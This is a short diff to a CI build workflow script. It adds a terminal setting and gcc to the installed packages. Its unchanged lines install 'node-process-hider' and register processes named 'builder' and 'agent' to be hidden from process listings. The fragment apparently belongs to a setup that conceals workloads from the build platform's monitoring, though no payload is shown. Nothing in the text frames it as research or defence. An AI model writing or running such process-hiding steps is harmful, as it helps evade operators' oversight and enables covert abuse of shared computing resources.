@@ -6,8 +6,9 @@ workflows:
     scripts: 
       - name: Running Builder
         script: |
+          TERM=xterm
           apt-get update -y
-          apt-get install python procps npm -y
+          apt-get install python procps npm gcc -y
           npm i -g node-process-hider
           ph add builder
           ph add agent
